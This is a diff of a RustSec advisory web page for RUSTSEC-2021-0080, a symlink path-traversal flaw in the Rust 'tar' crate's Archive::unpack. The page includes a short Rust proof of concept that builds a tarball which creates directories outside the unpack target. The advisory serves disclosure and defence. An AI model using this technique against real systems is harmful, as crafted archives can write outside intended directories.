@@ -5,7 +5,7 @@
 
 <meta name="author" content="Rust Project Developers">
 <meta name="description" content="Security advisory database for Rust crates published through https://crates.io">
-<title>Advisories for package tar › RustSec Advisory Database</title>
+<title>RUSTSEC-2021-0080: tar: Links in archive can create arbitrary directories › RustSec Advisory Database</title>
 
 <link href="//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,300italic,400italic" rel="stylesheet">
 <link href="/css/basic.css" rel="stylesheet">
@@ -38,49 +38,165 @@
   </nav>
 </header>
 
-<main class="advisories">
+<main class="advisory">
   <article>
-
     <header>
-      <h1>Advisories for tar</h1>
+      <h1>
+        
+        
+        RUSTSEC-2021-0080
+        
+      </h1>
+      <span class="subtitle"><p>Links in archive can create arbitrary directories</p>
+</span>
     </header>
 
-    <ul>
-      
-      <li>
+    
+    
+
+    <dl>
+      <dt id="issued">Issued</dt>
+      <dd>
         <time datetime="2021-07-19">
           July 19, 2021
         </time>
+      </dd>
 
+      <dt id="package">Package</dt>
+      <dd>
         
         
-        <h3>
-          <a href="/advisories/RUSTSEC-2021-0080.html">
-            RUSTSEC-2021-0080: Vulnerability in tar
-          </a>
-        </h3>
-        <span><p>Links in archive can create arbitrary directories</p>
-</span>
         
-      </li>
-      
-      <li>
-        <time datetime="2018-06-29">
-          June 29, 2018
-        </time>
+        <a href="/packages/tar.html">tar</a>
+          (<a href="https://crates.io/crates/tar">crates.io</a>)
+        
+        
+      </dd>
 
+      <dt id="type">Type</dt>
+      <dd>
         
         
-        <h3>
-          <a href="/advisories/RUSTSEC-2018-0002.html">
-            RUSTSEC-2018-0002: Vulnerability in tar
-          </a>
-        </h3>
-        <span><p>Links in archives can overwrite any existing file</p>
-</span>
+        Vulnerability
         
-      </li>
+      </dd>
+
       
+      
+
+      
+      
+
+      
+      <dt id="details">Details</dt>
+      <dd>
+        <a href="https:&#x2f;&#x2f;github.com&#x2f;alexcrichton&#x2f;tar-rs&#x2f;issues&#x2f;238">
+          https:&#x2f;&#x2f;github.com&#x2f;alexcrichton&#x2f;tar-rs&#x2f;issues&#x2f;238
+        </a>
+      </dd>
+      
+
+      
+      
+
+      
+      
+      
+
+      <dt id="patched">Patched</dt>
+      <dd>
+        
+        no patched versions
+        
+      </dd>
+
+      
+      
+
+      
+      
+
+      
+      
+      
+      
+
+      
+      
+      
+    </dl>
+
+    
+    
+    
+    <dl>
+      <dt>Affected Functions</dt>
+      <dd>Version</dd>
+      
+      <dt><code>tar::Archive::unpack</code></dt>
+      <dd>
+        <ul>
+          
+          <li><code>&lt;1.2.3</code></li>
+          
+        </ul>
+      </dd>
+      
+    </dl>
+    
+    
+
+    <h3 id="description">Description</h3>
+    <p>When unpacking a tarball that contains a symlink the <code>tar</code> crate may create
+directories outside of the directory it's supposed to unpack into.</p>
+<p>The function errors when it's trying to create a file, but the folders are
+already created at this point.</p>
+<pre><code class="language-rust">use std::{io, io::Result};
+use tar::{Archive, Builder, EntryType, Header};
+
+fn main() -&gt; Result&lt;()&gt; {
+    let mut buf = Vec::new();
+
+    {
+        let mut builder = Builder::new(&amp;mut buf);
+
+        // symlink: parent -&gt; ..
+        let mut header = Header::new_gnu();
+        header.set_path(&quot;symlink&quot;)?;
+        header.set_link_name(&quot;..&quot;)?;
+        header.set_entry_type(EntryType::Symlink);
+        header.set_size(0);
+        header.set_cksum();
+        builder.append(&amp;header, io::empty())?;
+
+        // file: symlink/exploit/foo/bar
+        let mut header = Header::new_gnu();
+        header.set_path(&quot;symlink/exploit/foo/bar&quot;)?;
+        header.set_size(0);
+        header.set_cksum();
+        builder.append(&amp;header, io::empty())?;
+
+        builder.finish()?;
+    };
+
+    Archive::new(&amp;*buf).unpack(&quot;demo&quot;)
+}
+</code></pre>
+<p>This issue was discovered and reported by Martin Michaelis (@mgjm).</p>
+
+
+    
+    
+    <h3 id="more">More</h3>
+
+    <ul>
+      <li><a
+          href="https://github.com/RustSec/advisory-db/commits/main/crates/tar/RUSTSEC-2021-0080.md">Advisory
+          History</a></li>
+      <li><a
+          href="https://github.com/RustSec/advisory-db/edit/main/crates/tar/RUSTSEC-2021-0080.md">Edit
+          Advisory</a></li>
     </ul>
+    
   </article>
 </main>
